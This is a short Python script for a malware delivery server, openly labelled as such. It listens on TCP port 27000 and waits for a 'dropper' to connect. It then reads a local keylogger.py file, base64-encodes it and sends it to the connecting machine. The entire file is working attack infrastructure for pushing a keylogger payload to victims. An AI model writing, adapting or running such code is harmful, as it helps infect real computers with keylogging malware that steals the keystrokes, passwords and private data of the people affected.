#!/usr/bin/env python3


import base64
import logging
import socket


class Server:

    def __init__(self, port):

        self._port = port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def malicious_code(self):

        with open("keylogger.py") as key:
            payload_text = key.read()

        return bytes(payload_text, 'utf-8')

    @property
    def port(self):

        return self._port

    @port.setter
    def port(self, new_port):

        self._port = new_port

    @property
    def socket(self):

        return self._socket

    def initialize(self):

        try:
            self.socket.bind(('0.0.0.0', self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')

        except socket.error:
            print('Server was not initialized due to an error.')

    def send_malicious_code(self):

        connection, address = self.socket.accept()
        with connection:

            print('Connection with dropper established from {}'.format(address))

            encoded_payload = base64.b64encode(self.malicious_code)
            connection.send(encoded_payload)


if __name__ == '__main__':

    logging.basicConfig(level=logging.DEBUG)

    server = Server(27000)
    server.initialize()
    server.send_malicious_code()
